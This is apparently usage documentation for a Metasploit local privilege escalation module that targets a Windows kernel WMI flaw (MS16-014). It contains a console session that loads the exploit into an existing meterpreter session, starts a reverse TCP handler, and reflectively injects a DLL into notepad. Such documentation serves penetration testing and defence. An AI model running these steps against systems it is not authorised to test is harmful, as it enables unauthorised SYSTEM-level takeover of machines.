## Intro

This module exploits a uninitialized stack variable vulnerability present in the WMI subsystem  of `ntoskrnl`.  The vulnerability is described by MS16-014 and CVE-2016-0040.  The module allows the user to elevate privileges (NT AUTHORITY\SYSTEM)

## Usage

You'll first need to obtain a session on the target system.  Next, once the module is loaded, one simply needs to set the `payload` and `session` options.  From here, running the module will result in the payload being executed with system level privileges.

An example session follows:


```
meterpreter > background
[*] Backgrounding session 0...
msf exploit(handler) > use exploits/windows/local/ms16_014_wmi_recv_notif
msf exploit(ms16_014_wmi_recv_notif) > set session 0
session => 0
msf exploit(ms16_014_wmi_recv_notif) > exploit

[*] Started reverse TCP handler on 172.16.38.170:4444 
[*] Launching notepad to host the exploit...
[+] Process 3948 launched.
[*] Reflectively injecting the exploit DLL into 3948...

[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
